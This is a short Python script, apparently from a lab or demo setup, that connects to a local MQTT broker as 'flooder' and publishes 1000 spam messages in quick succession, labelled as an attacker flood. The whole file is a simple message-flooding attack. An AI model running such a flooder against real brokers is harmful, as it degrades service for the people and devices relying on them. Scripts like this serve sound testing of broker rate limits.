import paho.mqtt.client as mqtt
import time

client = mqtt.Client(client_id="flooder")
client.connect("localhost", 1883, 60)

print("[ATTACKER-FLOOD] Sending messages...")

for i in range(1000):
    client.publish("spam/topic", f"SPAM {i}")
    time.sleep(0.01)